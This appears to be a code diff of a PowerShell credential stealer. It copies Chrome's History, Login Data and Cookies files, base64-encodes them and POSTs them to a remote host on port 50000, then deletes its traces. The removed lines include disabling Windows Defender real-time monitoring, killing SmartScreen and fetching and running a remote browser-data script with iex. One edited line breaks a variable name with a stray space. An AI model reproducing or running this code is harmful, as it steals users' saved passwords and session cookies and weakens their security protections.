@@ -1,19 +1,5 @@
-# taskkill /IM sqlservr.exe /F
-# taskkill /IM w3wp.exe /F
-# taskkill /IM msedge.exe /F
-# taskkill /IM Batch.exe /F
-
-explorer https://www.youtube.com/watch?v=dQw4w9WgXcQ
-
-Set-MpPreference -DisableRealtimeMonitoring $true
-taskkill /IM smartscreen.exe /F
-
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
-iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Get-BrowserData.ps1'))
-
-Get-BrowserData > "$($env:USERPROFILE)\out.txt"
-
-$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.txt"))
+Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Default\History" "$($env:USERPROFILE)\out.f"
+$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
 echo $base64string > "$($env:USERPROFILE)\out.txt"
 
 Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Default\Login Data" "$($env:USERPROFILE)\out2.f"
@@ -26,7 +12,7 @@ echo $base64string > "$($env:USERPROFILE)\out3.txt"
 
 Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Default\Cookies" "$($env:USERPROFILE)\out4.f"
 $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out4.f"))
-echo $base64string > "$($env:USERPROFILE)\out4.txt"
+echo $base64string > "$($env:USERPROFI LE)\out4.txt"
 
 Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveHistory -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out.txt" -Raw}
 Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveLoginData -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out2.txt" -Raw}
@@ -37,8 +23,7 @@ Remove-Item "$($env:USERPROFILE)\out.txt"
 Remove-Item "$($env:USERPROFILE)\out2.txt"
 Remove-Item "$($env:USERPROFILE)\out3.txt"
 Remove-Item "$($env:USERPROFILE)\out4.txt"
+Remove-Item "$($env:USERPROFILE)\out.f"
 Remove-Item "$($env:USERPROFILE)\out2.f"
 Remove-Item "$($env:USERPROFILE)\out3.f"
 Remove-Item "$($env:USERPROFILE)\out4.f"
-
-Set-MpPreference -DisableRealtimeMonitoring $false
